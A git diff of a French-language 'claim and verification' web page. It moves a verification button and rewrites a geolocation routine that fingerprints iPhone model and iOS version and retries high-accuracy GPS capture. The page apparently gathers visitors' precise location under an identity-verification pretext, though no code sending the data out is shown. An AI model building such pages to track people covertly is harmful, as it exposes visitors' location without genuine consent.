@@ -60,6 +60,10 @@
             Vos données servent uniquement à vérifier votre identité et vous contacter.
         </p>
 
+        <button id="claim-button"
+        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
+        Continuer la vérification
+        </button>
         <!-- 🎥 Vidéo YouTube de Présentation -->
         <!-- 🎥 Vidéo explicative officielle -->
         <div id="video-placeholder" class="relative cursor-pointer group">
@@ -90,10 +94,7 @@
   
 
 
-        <button id="claim-button"
-            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
-            Continuer la vérification
-        </button>
+ 
     </div>
 
     <!-- 📝 FORMULAIRE -->
@@ -163,83 +164,147 @@
 <script>
     // 🔥 Récupère tous les paramètres de l'URL
     const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
-    function getGPSCoordinates() {
-    return new Promise(async (resolve) => {
+    /* -----------------------------------------------------
+   Détection de l'OS, version iOS et modèles iPhone
+----------------------------------------------------- */
+function detectIOSVersion() {
+    const ua = navigator.userAgent;
+    if (/iP(hone|od|ad)/.test(ua)) {
+        const v = ua.match(/OS (\d+)_/);
+        return v ? parseInt(v[1]) : null;
+    }
+    return null;
+}
 
-        // ESSAI GPS RAPIDE
-        if (navigator.geolocation) {
-            try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => res(p),
-                        (e) => rej(e),
-                        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
-                    );
-                });
+function detectIPhoneModel() {
+    const ratio = window.devicePixelRatio || 1;
+    const screen = {
+        w: window.screen.width * ratio,
+        h: window.screen.height * ratio
+    };
 
-                return resolve({
-                    method: "gps",
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    source: "getCurrentPosition"
-                });
+    // Détection approximative (iPhone 11 = 828×1792 px)
+    if ((screen.w === 828 && screen.h === 1792) ||
+        (screen.w === 896 && screen.h === 414)) {
+        return "iPhone 11";
+    }
 
-            } catch (err) {
-                console.warn("⚠️ GPS rapide KO :", err.message);
-            }
+    return "Unknown";
+}
+
+/* -----------------------------------------------------
+   NOUVELLE FONCTION GPS FULL AUTO
+   Compatible iPhone 11 / iOS ≤ 15
+----------------------------------------------------- */
+async function getGPSCoordinates() {
+
+    const iOS = detectIOSVersion();
+    const iPhoneModel = detectIPhoneModel();
+
+    console.log("📱 Modèle détecté :", iPhoneModel);
+    console.log("📱 Version iOS détectée :", iOS);
+
+    const isOldIOS = iOS && iOS <= 15;
+    const isIphone11 = iPhoneModel === "iPhone 11";
+
+    /* -------------------------------------------------
+       MODE SPÉCIAL POUR iPhone 11 & iOS ≤ 15
+       (super stable et compatible)
+    ------------------------------------------------- */
+    if (isOldIOS || isIphone11) {
+        console.warn("⚠️ Mode iPhone 11 / iOS ancien activé");
+
+        const tryOnce = () =>
+            new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => res(p),
+                    (e) => rej(e),
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+
+        // Tentative 1
+        try {
+            const pos1 = await tryOnce();
+            return {
+                method: "safeMode",
+                latitude: pos1.coords.latitude,
+                longitude: pos1.coords.longitude,
+                accuracy: pos1.coords.accuracy,
+                source: "first_attempt"
+            };
+        } catch (err) {
+            console.warn("⛔ Tentative 1 KO :", err.message);
         }
 
-        // ESSAI GPS HAUTE PRÉCISION
-        if (navigator.geolocation) {
-            try {
-                const precise = await new Promise((resolvePrecise, rejectPrecise) => {
-                    let resolved = false;
-                    const watchId = navigator.geolocation.watchPosition(
-                        (p) => {
-                            if (!resolved && p.coords.accuracy < 80) {
-                                resolved = true;
-                                navigator.geolocation.clearWatch(watchId);
-                                resolvePrecise({
-                                    method: "gps",
-                                    latitude: p.coords.latitude,
-                                    longitude: p.coords.longitude,
-                                    accuracy: p.coords.accuracy,
-                                    source: "watchPosition"
-                                });
-                            }
-                        },
-                        (err) => {
-                            try { navigator.geolocation.clearWatch(watchId); } catch(e){}
-                            rejectPrecise(err);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
+        await new Promise(r => setTimeout(r, 2000));
 
-                    setTimeout(() => {
-                        if (!resolved) {
-                            try { navigator.geolocation.clearWatch(watchId); } catch(e){}
-                            rejectPrecise(new Error("watchPosition timeout"));
-                        }
-                    }, 10000);
-                });
-
-                return resolve(precise);
-
-            } catch (err) {
-                console.warn("⚠️ GPS haute précision KO :", err.message);
-            }
+        // Tentative 2
+        try {
+            const pos2 = await tryOnce();
+            return {
+                method: "safeMode",
+                latitude: pos2.coords.latitude,
+                longitude: pos2.coords.longitude,
+                accuracy: pos2.coords.accuracy,
+                source: "second_attempt"
+            };
+        } catch (err) {
+            console.warn("⛔ Tentative 2 KO :", err.message);
         }
 
-        // FALLBACK CLEAN
-        return resolve({
+        // Fallback
+        return {
             method: "denied",
             latitude: 0,
             longitude: 0,
             accuracy: null,
-            source: "none"
+            source: "fallback"
+        };
+    }
+
+    /* -------------------------------------------------
+       MODE NORMAL — pour iPhone modernes / Android
+    ------------------------------------------------- */
+    console.log("🚀 Mode GPS Rapide activé (appareil récent)");
+
+    // Tentative rapide
+    try {
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(
+                (p) => res(p),
+                (e) => rej(e),
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                }
+            );
         });
-    });
+
+        return {
+            method: "fast",
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            source: "getCurrentPosition"
+        };
+
+    } catch (err) {
+        console.warn("⚠️ GPS rapide KO, fallback simple…");
+    }
+
+    return {
+        method: "denied",
+        latitude: 0,
+        longitude: 0,
+        accuracy: null,
+        source: "fallback"
+    };
 }
 
     
